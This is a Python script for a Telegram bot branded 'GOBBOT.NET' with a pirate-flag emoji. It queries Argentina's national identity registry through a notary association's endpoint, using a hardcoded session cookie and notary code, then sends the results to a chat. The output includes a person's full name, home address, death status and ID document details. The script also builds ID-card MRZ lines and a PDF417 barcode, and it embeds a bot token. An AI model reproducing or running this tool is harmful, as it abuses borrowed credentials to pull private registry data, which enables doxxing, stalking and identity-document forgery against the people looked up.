import requests
from telebot import TeleBot
import sys
import unicodedata
from datetime import datetime
import pdf417gen
import base64
from io import BytesIO
from PIL import Image

bot = TeleBot("7255534026:AAHKeYg1eLBgSXrXipLTudvpC8F6OudKeSA")

dni = sys.argv[1]
gender = sys.argv[2]
chat_id = sys.argv[3]

def convertir_fecha(input_fecha):
    try:
        fecha_obj = datetime.strptime(input_fecha, "%d/%m/%Y")
        return fecha_obj.strftime("%y%m%d")
    except ValueError:
        return "000000"

def check_digit(s):
    m = [7, 3, 1]
    n = 0

    for i, char in enumerate(s):
        if char.isdigit():
            n += int(char) * m[i % 3]
        else:
            return -1

    return n % 10

def quitar_acentos(cadena):
    cadena_normalizada = ''.join(c for c in unicodedata.normalize('NFD', cadena) if unicodedata.category(c) != 'Mn')
    cadena_limpia = ''.join(c if c.isalnum() or c.isspace() or c == '<' else ' ' for c in cadena_normalizada)
    return cadena_limpia.upper()

def generar_idarg(dni, apellido, nombres, fecha_nacimiento, sexo, fecha_vencimiento):
    fecha_nacimiento = convertir_fecha(fecha_nacimiento)
    fecha_vencimiento = convertir_fecha(fecha_vencimiento)

    DigitoVerificador1 = check_digit(str(dni))
    DigitoVerificador2 = check_digit(fecha_nacimiento)
    DigitoVerificador3 = check_digit(fecha_vencimiento)
    DigitoVerificador4 = check_digit(f"{dni}0{DigitoVerificador1}{fecha_nacimiento}{DigitoVerificador2}{fecha_vencimiento}{DigitoVerificador3}")

    linea1 = f"IDARG{dni}<{DigitoVerificador1}"
    linea2 = f"{fecha_nacimiento}{DigitoVerificador2}{sexo.upper()}{fecha_vencimiento}{DigitoVerificador3}ARG<<<<<<<<<<<{DigitoVerificador4}"
    linea3 = f"{quitar_acentos(apellido)}<<{quitar_acentos(nombres.replace(' ', '<'))}"

    linea1 = linea1.ljust(30, '<')
    linea2 = linea2.ljust(30, '<')
    linea3 = linea3.ljust(30, '<')

    msg = f"{linea1}\n{linea2}\n{linea3}"
    return msg.strip()

def consulta_renaper(dni, gender, chat_id):
    try:
        url = "https://cnmza.org.ar/escribano/renaper/v2/api_renaper.php"
        cookies = {"PHPSESSID": "p7k0a9dfglq4tdp96aqj6hkub6"}
        data = {
            "dni": dni,
            "gender": gender,
            "codigoNotario": "704",
            "consultaRenaper": "1"
        }

        response = requests.post(url, cookies=cookies, data=data)

        if response.status_code == 200:
            response_data = response.json()
            estado = response_data.get('estado')
            datoRenaper = response_data.get('datoRenaper', {})

            numero_dni = datoRenaper.get('id_ciudadano')
            if not numero_dni:
                return  # No enviar nada si 'id_ciudadano' no está disponible.

            fecha_nacimiento = datoRenaper.get('fecha_nacimiento', '00/00/0000')
            fecha_vencimiento = datoRenaper.get('fecha_vencimiento', '00/00/0000')
            apellido = datoRenaper.get('apellido', 'DESCONOCIDO')
            nombres = datoRenaper.get('nombres', 'DESCONOCIDO')

            # Generar IDARG
            idarg_data = generar_idarg(dni, apellido, nombres, fecha_nacimiento, gender, fecha_vencimiento)

            # Enviar IDARG en un mensaje separado
            bot.send_message(chat_id, f"`𝗚𝗢𝗕𝗕𝗢𝗧.𝗡𝗘𝗧 🏴‍☠️\n\n{idarg_data}`", parse_mode="Markdown")

            # Generar datos PDF417
            pdf417_data = (
                f"00{datoRenaper.get('id_tramite_principal', '')}@"
                f"{apellido}@"
                f"{nombres}@"
                f"{gender}@"
                f"{dni}@"
                f"{datoRenaper.get('ejemplar', '')}@"
                f"{fecha_nacimiento}@"
                f"{fecha_vencimiento}@"
                f"{datoRenaper.get('cuil')[:2] + datoRenaper.get('cuil')[-1]}"
            )

            # Generar código PDF417
            codes = pdf417gen.encode(pdf417_data)
            image = pdf417gen.render_image(codes)
            image.save("pdf417.png")

            # Enviar PDF417 en un mensaje separado
            bot.send_message(chat_id, f"`𝗚𝗢𝗕𝗕𝗢𝗧.𝗡𝗘𝗧 🏴‍☠️\n\n[›››] PDF417\n\n{pdf417_data}`", parse_mode="Markdown")
            with open("pdf417.png", "rb") as photo:
                bot.send_photo(chat_id, photo)

            # Enviar datos adicionales en un mensaje separado
            formatted_data = (
                f"`𝗚𝗢𝗕𝗕𝗢𝗧.𝗡𝗘𝗧 🏴‍☠️\n\n"
                f"➜ Nombre: {nombres}\n"
                f"➜ Apellido: {apellido}\n"
                f"➜ Nacimiento: {fecha_nacimiento}\n\n"
                f"➜ Id Trámite Principal: {datoRenaper.get('id_tramite_principal')}\n"
                f"➜ IdCiudadano: {datoRenaper.get('id_ciudadano')}\n\n"
                f"[›››] Dirección\n\n"
                f"➜ Calle: {datoRenaper.get('calle')}\n"
                f"➜ Número: {datoRenaper.get('numero')}\n"
                f"➜ Piso: {datoRenaper.get('piso')}\n"
                f"➜ Departamento: {datoRenaper.get('departamento')}\n"
                f"➜ C.Postal: {datoRenaper.get('codigo_postal')}\n"
                f"➜ Barrio: {datoRenaper.get('barrio')}\n"
                f"➜ Monoblock: {datoRenaper.get('monoblock')}\n"
                f"➜ Ciudad: {datoRenaper.get('ciudad')}\n"
                f"➜ Municipio: {datoRenaper.get('municipio')}\n"
                f"➜ Provincia: {datoRenaper.get('provincia')}\n"
                f"➜ País: {datoRenaper.get('pais')}\n\n"
                f"[›››] Información Extra\n\n"
                f"➜ Estado Fallecido: {datoRenaper.get('codigo_fallecido')}\n"
                f"➜ Mensaje Fallecido: {datoRenaper.get('mensaje_fallecido')}\n"
                f"➜ Origen Fallecido: {datoRenaper.get('origen_fallecido')}\n"
                f"➜ Fecha Fallecido: {datoRenaper.get('fecha_fallecido')}\n"
           
                f"➜ Ejemplar: {datoRenaper.get('ejemplar')}\n"
                f"➜ Fecha Vencimiento: {datoRenaper.get('fecha_vencimiento')}\n"
                f"➜ Fecha Emisión: {datoRenaper.get('fecha_emision')}\n"
              
                "`"
            )

            bot.send_message(chat_id, formatted_data, parse_mode="Markdown")

    except Exception as e:
        bot.send_message(chat_id, f"Ocurrió un error durante la consulta")

consulta_renaper(dni, gender, chat_id)
